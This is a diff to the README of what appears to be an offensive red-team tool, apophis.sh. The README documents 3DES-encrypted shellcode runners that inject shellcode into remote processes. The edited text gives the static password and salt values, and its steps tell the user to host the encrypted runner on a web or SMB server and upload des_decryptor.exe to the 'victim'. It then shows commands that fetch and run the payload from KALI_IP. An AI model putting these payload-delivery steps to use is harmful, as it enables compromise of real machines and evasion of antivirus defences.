@@ -101,12 +101,12 @@ drwxr-xr-x 9 kali kali  4096 Feb  2 08:20 ..
 
 ### 1.1 Triple DES
 
-The 3DES payloads are located under ```payloads/3DES/``` directory with names:
+The 3DES shellcode runners are located under ```payloads/3DES/``` directory with names:
 - des_decryptor.exe
 - des_decryptor_embedded.exe
 - des_decryptor_embedded_marshall.exe
 
-There are three shellcode runners and MUST executed diferrently. Password, Salt and IV are static values but you can modified them as you need.
+Password, Salt and IV are static values but you can modified them as you need.
 
 - **Password**: oqphnbt0kuedizy4m3avx6r5lf21jc8s
 - **Salt**: vh9b4tsxrl1560wg8nda2meuc7yjzop3
@@ -114,14 +114,14 @@ There are three shellcode runners and MUST executed diferrently. Password, Salt 
 
 
 #### 1.1.1 Execution of des_decryptor.exe (Needs the path of Shellcode Runner)
-The executable **des_decryptor.exe** doesn't contain a shellcode in it. For this reason, we have to provide a shellcode runner on command-line. There are two 3DES encrypted Shellcode runners that you can put either to a Web or to an SMB Server:
+The executable **des_decryptor.exe** doesn't contain a shellcode in it. For this reason, we have to provide a shellcode runner on command-line. There are two 3DES encrypted Shellcode runners that you can put either to a Web or an SMB Server:
 - des_decryptor_embedded.exe (It will inject the shellcode into the remote process that you have provided in the ```line 11 of apophis.sh```)
 - des_decryptor_embedded_marshal.exe (It will inject the shellcode into ```des_decryptor.exe```)
 
 
 **Steps**
-- Copy any 3DES Shellcode runner that is located under ```payloads/3DES/``` to your Web Server
-- Upload des_decryptor.exe to victim
+- Copy any 3DES Shellcode runner that is located under ```payloads/3DES/``` to your Web/SMB Server
+- Upload ```des_decryptor.exe``` to victim
 - Execute it as follows
 
 ```
@@ -132,8 +132,16 @@ cmd> des_decryptor.exe http://KALI_IP/des_decryptor_embedded_marshal.exe
 cmd> des_decryptor.exe smb://KALI_IP/des_decryptor_embedded_marshal.exe
 ```
 
-#### 1.1.2 Method 2 (Embeds the Shellcode Runner + )
-The executable ```des_decryptor_embeded.exe``` embeds the shellcode in base64, which before was ecrypted with ```TripleDESEncryptor.ps1```. Doesn't need command-line arguments for the execution. Upload the file to the victim and execute it.
+#### 1.1.2 Execution of des_decryptor_embedded.exe
+The executable ```des_decryptor_embeded.exe``` embeds the shellcode in base64, which before was ecrypted with ```TripleDESEncryptor.ps1```. Doesn't need command-line arguments for the execution. 
+
+```
+It will inject the shellcode into the remote process that you have provided in the ```line 11 of apophis.sh```
+```
+
+**Steps**
+- Upload the file to the victim
+- Execute it as follows:
 
 ```
 cmd> des_decryptor_embedded.exe
